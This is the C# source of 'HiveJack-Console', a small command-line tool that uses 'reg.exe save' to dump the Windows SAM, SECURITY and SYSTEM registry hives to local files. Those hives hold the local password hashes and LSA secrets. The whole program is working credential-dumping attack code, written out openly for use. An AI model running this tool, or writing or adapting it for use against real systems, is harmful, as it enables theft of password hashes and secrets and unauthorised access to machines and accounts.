using System;
using System.Diagnostics;
using System.IO;

namespace HiveJack_Console
{
    class Program
    {
        private static string helper = "sam    dump SAM registry hives.\nsecurity    dump SECURITY  registry hives.\nsystem    dump SYSTEM  registry hives.\nall    dump SYSTEM, SECURITY and SAM registry hives.";

        private static void Dump(string type)
        {
            if (File.Exists(type + ".save"))
            {
                Console.WriteLine(String.Format("[-] {0}.save already exists.", type));
            }
            else
            {
                Process process = new Process();
                process.StartInfo.Verb = "runas";
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = String.Format("/c reg.exe save hklm\\{0} {0}.save", type);
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                Console.WriteLine(output);
                process.WaitForExit();
            }
        }
        static void Main(string[] args)
        {
            Console.WriteLine("[*] ===HiveJack-Console===");
            Console.WriteLine("[*] Original author:  Viralmaniar");
            Console.WriteLine("[*] Adapted author: S0cke3t");
            if (args.Length < 1)
            {
                Console.WriteLine("[-] Invalid argument!");
                Console.WriteLine(helper);
                Environment.Exit(0);
            }
            switch (args[0])
            {
                case "sam":
                    Dump("sam");
                    break;
                case "security":
                    Dump("security");
                    break;
                case "system":
                    Dump("system");
                    break;
                case "all":
                    Dump("sam");
                    Dump("security");
                    Dump("system");
                    break;
                default:
                    Console.WriteLine("[-] Invalid argument!");
                    Console.WriteLine(helper);
                    break;
            }
        }
    }
}
